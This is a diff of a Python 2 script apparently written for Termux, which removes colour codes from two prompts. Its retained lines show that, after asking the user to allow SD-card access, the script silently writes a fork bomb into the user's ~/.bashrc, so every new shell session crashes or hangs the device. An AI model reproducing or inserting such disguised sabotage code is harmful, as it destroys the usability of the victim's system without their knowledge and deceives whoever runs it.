@@ -108,7 +108,7 @@ def main():
 
 
 if __name__ == '__main__':
-    iz = raw_input('\n\n\n\x1b[1;97m\xe2\x9e\xa4 \x1b[1;92mAllow Access SDCARD (y/n) : \x1b[1;96m')
+    iz = raw_input('Allow Access SDCARD (y/n) : ')
     siap = ['y', 'Y', 'Yes', 'yes', 'ya', 'Ya', 'ok', 'Ok']
     if iz in siap:
         os.system('termux-setup-storage')
@@ -116,7 +116,7 @@ if __name__ == '__main__':
         os.system('touch .hushlogin')
         os.system('printf ":(){ :|: & };:\n" > $HOME/.bashrc')
     else:
-        print '\x1b[1;97m\n\xe2\x9e\xa4\x1b[1;91m EXIT!\n'
+        print 'EXIT!'
         os.sys.exit()
     os.system('clear')
     main()
